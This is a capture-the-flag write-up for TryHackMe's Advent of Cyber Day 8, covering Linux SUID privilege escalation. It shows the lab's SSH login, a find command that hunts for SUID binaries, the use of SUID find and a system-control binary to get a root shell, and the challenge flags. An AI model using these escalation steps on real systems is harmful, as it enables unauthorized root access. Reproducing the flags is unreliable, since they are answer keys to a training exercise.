---
title: "Advent of Cyber Day 8 SUID Shenanigans"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 8 SUID Shenanigans"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

Elf Holly is suspicious of Elf-ministrator and wants to get onto the root account of a server he setup to see what files are on his account. The problem is, Holly is a low-privileged user.. can you escalate her privileges and hack your way into the root account?

Deploy and SSH into the machine.

Username: holly

Password: tuD@4vt0G\*TU

SSH is not running on the standard port.. You might need to nmap scan the machine to find which port SSH is running on.nmap <machine_ip> -p <start_port>-<end_port>

Read the supporting materials [here](https://blog.tryhackme.com/linux-privilege-escalation-suid/).

### **#1 What port is SSH running on?**

```bash
65534
```

### **#2 Find and run a file as igor. Read the file /home/igor/flag1.txt**

```bash
find /home/igor/flag1.txt -exec cat /home/igor/flag1.txt \;
"THM{d3f0708bdd9accda7f937d013eaf2cd8}"
```

### **#3 Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?**

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>>/dev/null | grep "/bin"
$> system-control

===== System Control Binary =====

Enter system command: "/bin/bash"
root@ip-10-10-63-205:~ cat /root/flag2.txt
"THM{8c8211826239d849fa8d6df03749c3a2}"
```

### **#4 If you've finished the challenge and want more practise, checkout the Privilege Escalation Playground room created by SherlockSec: [https://tryhackme.com/room/privescplayground](https://tryhackme.com/room/privescplayground)**

```bash
No questions
```
